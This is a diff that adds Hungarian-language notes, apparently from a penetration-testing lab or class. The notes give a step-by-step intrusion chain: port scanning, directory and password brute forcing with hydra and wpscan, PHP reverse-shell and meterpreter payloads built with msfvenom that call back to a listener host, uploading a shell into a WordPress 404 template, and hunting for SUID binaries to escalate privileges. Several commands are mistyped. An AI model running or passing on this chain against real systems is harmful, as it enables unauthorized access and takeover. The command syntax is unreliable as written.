@@ -1,0 +1,81 @@
+nmap: portok felderítése
+	python:
+	-0
+	-p portok
+	-v több info
+	-SV nemtom
+
+python3 -m http.server [portszám pl 8080] :szerverindítás
+
+aloldalak megkeresése: dirb http://40.0.3.13
+
+hydra:
+-1 1 ember -L sok ember -p egy jelszó -P sok
+hydra -1 admin -P usr/share/wordlists/rockyou.txt http-get://40.0.3.13/admin
+
+dirbuster& megnyitja az alkalmazást
+oda a címnek http://40.0.3.13
+fájl: /usr/share/wordlists/dirb/common.txt
+advenced optionsban: authentication options: admin név princess jelszó (amivel belépek az odlalra)
+utána start
+
+http://40.0.3.13/admin/index.php
+itt forrást megnézni
+
+új terminal nyitás
+sudo bash
+msfvenom-1 payload | less
+q-val lehet kilépni
+msfvenom-1 payload | grep php | grep reverse
+kikeresni a php valamit php/reverse_php
+msfvenom -p php/reverse_php -o alma.php LHOST-30.0.1.13 LPORT-4444
+vi alma.php: meg lehet vele nézni a tartalmát
+ctrl c: :qa és ki lehet lépni
+az oldalra az alma.php feltöltése amia home mappában van.
+
+msfconsole
+	use multi/handler
+	set payload/reverse_php
+	set lhost 30.0.1.14
+	run
+utána exit
+
+msfvenom -1 payload | grep php | grep reverse | grep meterpreter
+php/meterpreter/reverse_tcp kimásolása
+msfvenom -p php/meterpreter/reverse_tcp -o korte.php LHOST-30.0.1.13 LPORT-4444
+
+msfconsole
+	use multi/handler
+	set payload php/meterpreter/reverse_tcp
+	set lhost 30.0.1.14
+	run
+utána exit
+
+innen kakó
+
+valamit megkell nyitni
+valami www-data cucc
+find / 2>dev/null user root -pperm -u-s, ox
+
+gtfobins.github.io
+itt +suid keresőbe vagy rákattintani a SUID-ra
+
+40.0.4.13 wordpress oldal
+nmap 40.0.4.13
+dirb http://40.0.4.13
+http://40.0.4.13/wp-admin mozzillában mert kiadta és ez a bejelentkező cucc
+wpscan --url http://40.0.4.13
+wpscan --url http://40.0.4.13 -e vp
+wpscan --url http://40.0.4.13 --usernames admin -passwords /usr/share/wordlists/dirb/common.txt kiadta hogy final fantasy a jelszó
+be lehet lépni az admin felületre
+
+ott 1 plummaban ami egy szövegszerkesztő
+ott meg kell nyitni a korte.php-t
+azt bemásolni a 404 template cuccba
+
+és megint ez
+msfconsole
+	use multi/handler
+	set payload php/meterpreter/reverse_tcp set lhost 30.0.1.14
+	run
+utána exit
